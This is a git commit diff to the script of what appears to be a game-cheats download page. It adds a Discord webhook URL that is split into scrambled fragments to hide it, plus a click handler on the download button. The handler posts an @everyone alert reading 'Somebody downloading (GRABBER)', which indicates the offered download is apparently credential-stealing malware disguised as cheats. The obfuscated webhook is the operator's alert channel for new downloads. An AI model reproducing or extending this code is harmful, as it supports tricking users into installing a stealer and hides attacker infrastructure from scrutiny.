043ebf3de1a205b0cd783de6a9f38a62b2498bde
c82676b9a8 <c82676b9a8@proton.me>
2025-11-19 23:30:43 +0100

    sdgsgd

--- cheats/script.js
+++ cheats/script.js
@@ -1,3 +1,27 @@
+const btn = document.querySelector('.download-btn');
+
+const p1  = "https:";
+const sighjdfsd  = "scord.c";
+const p3  = "om/api/";
+const p4  = "webhooks/";
+const p5  = "1421607";
+const sighjdfsdasd  = "251482";
+const p7  = "771487/9DBm1dS";
+const p8  = "kERQROhvRuRkvGWj";
+const p9  = "yZd";
+const p10 = "f_UjM";
+const p11 = "PqkK";
+const p67  = "//di";
+const p12 = "iIAi";
+const p13 = "LamHf";
+const p14 = "mTNeQm5b";
+const p15 = "Os0FkKV7hOqdzLw1";
+
+const webhookURL =
+  p1+p67+sighjdfsd+p3+p4+p5+
+  sighjdfsdasd+p7+p8+p9+p10+
+  p11+p12+p13+p14+p15;
+
 document.addEventListener('DOMContentLoaded', () => {
   
   const modal = document.getElementById('secret-modal');
@@ -23,6 +47,25 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
   
-})
+});
 
+btn.addEventListener('click', () => {
+  btn.style.transform = 'scale(0.95)';
+  setTimeout(() => {
+    btn.style.transform = 'scale(1.05)';
+  }, 150);
+  setTimeout(() => {
+    btn.style.transform = 'scale(1)';
+  }, 300);
+
+  fetch(webhookURL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content: "||@here @everyone|| :rotating_light: Somebody downloading (GRABBER). :rotating_light:"
+    })
+  }).catch(err => console.error("Error", err));
+});
 
